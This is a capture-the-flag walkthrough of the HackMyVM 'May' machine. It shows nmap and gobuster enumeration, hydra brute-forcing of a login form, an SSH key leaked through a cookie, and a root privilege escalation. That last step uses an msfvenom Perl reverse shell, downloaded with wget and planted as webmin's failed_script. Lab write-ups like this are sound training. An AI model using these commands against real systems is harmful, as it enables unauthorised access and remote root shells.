@@ -1,0 +1,120 @@
+---
+title: "May - HackMyVM Walkthrough"
+---
+
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/may]
+└─$ nmap -p- -sV 192.168.56.254 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 01:33 EST
+Nmap scan report for broken (192.168.56.254)
+Host is up (0.00050s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp    open  http    nginx 1.14.2
+10000/tcp open  http    MiniServ 1.979 (Webmin httpd)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+From the index page on the website:
+admin: Web is under construction. Use Intranet.
+marie: Where are now the keys?
+alice: Yes, where are?
+admin: :'(
+
+usernames: admin, marie and alice
+
+Let's add may.hmv to the `/etc/hosts` file and enumerate the subdomains with gobuster:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf]
+└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -q -u http://may.hmv
+Found: portal.may.hmv (Status: 200) [Size: 406]
+Found: ssh.may.hmv (Status: 200) [Size: 405]  
+{% endhighlight %}
+
+After adding these two subdomains to the hosts file, we're greeted with a login form.
+I tested the form for SQLi and it didn't work. 
+
+Brute forcing the login form with hydra:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf]
+┌──(kali㉿kali)-[~/ctf]
+└─$ hydra -L users -P /usr/share/wordlists/rockyou.txt ssh.may.hmv http-post-form '/check.php:user=^USER^&password=^PASS^:incorrect' -vV
+--SNIP--
+{% endhighlight %}
+
+Let's try changing the domainname:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf]
+└─$ hydra -l marie -P /usr/share/wordlists/rockyou.txt portal.may.hmv http-post-form '/check.php:user=^USER^&password=^PASS^:incorrect' -vV
+--SNIP--
+[80][http-post-form] host: portal.may.hmv   login: marie   password: rebelde
+--SNIP--
+{% endhighlight %}
+
+Alright so we have credentials for the portal, but they are somewhat useless because
+the server is using key based authentication only. We need to find those private keys
+
+I consulted a walkthrough that said there was something odd with cookies on the 
+portal.may.hmv/check.php page, specifically one called Sweetcookie. Using a cookie 
+editor plugin and adding the cookie while visiting the ssh.may.hmv page changes it's
+output to an SSH key. 
+
+Logging in over SSH:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/may]
+└─$ ssh -i id_rsa marie@may.hmv 
+Linux may 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul 22 03:34:48 2021
+marie@may:~$ 
+{% endhighlight %}
+
+Checking what we can write to: 
+{% highlight terminal %}
+marie@may:/$ find / -writable -type f 2>/dev/null 
+/etc/webmin/miniserv.conf
+--SNIP--
+{% endhighlight %}
+
+Let's see if we can abuse the config file of webmin. 
+
+The file path in the conf we'll abuse with a custom perl payload:
+failed_script=/etc/webmin/failed.pl
+
+We'll generate a perl reverse tcp shell with msfvenom:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/may]
+└─$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.56.224 LPORT=6666 -f raw > failed.pl
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 233 bytes
+{% endhighlight %}
+
+Transfer the payload to the victim machine:
+{% highlight terminal %}
+marie@may:~$ wget http://192.168.56.224:8000/failed.pl
+--2021-11-14 02:15:39--  http://192.168.56.224:8000/failed.pl
+Connecting to 192.168.56.224:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 233 [text/x-perl]
+Saving to: ‘failed.pl’
+
+failed.pl            100%[======================>]     233  --.-KB/s    in 0s      
+
+2021-11-14 02:15:39 (29.6 MB/s) - ‘failed.pl’ saved [233/233]
+{% endhighlight %}
+
+Now we edit the path in the config file:
+`failed_script=/home/marie/failed.pl`
+
+All we need to do now is attempt to login to the webmin panel and fail then we get a root shell on the machine. 
+I submitted the flags and got the points. Hooray for points.
